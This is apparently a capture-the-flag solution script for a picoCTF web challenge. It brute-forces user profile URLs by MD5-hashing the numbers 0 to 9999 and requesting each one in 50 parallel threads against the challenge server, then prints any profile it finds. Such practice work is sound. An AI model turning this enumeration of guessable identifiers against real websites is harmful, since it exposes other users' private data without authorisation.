import requests
import hashlib
from utils.pretty_print import pretty_print
from concurrent.futures import ThreadPoolExecutor

url = "http://crystal-peak.picoctf.net:64460/profile/user/"
    
def try_user(i):
    hashed = hashlib.md5(str(i).encode())
    hashed_clean = str(hashed.hexdigest())
    url_hash = url + hashed_clean
    res = requests.get(url_hash)
    if 'User not found' not in res.text:
        pretty_print(res)

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_user, range(0,10000))
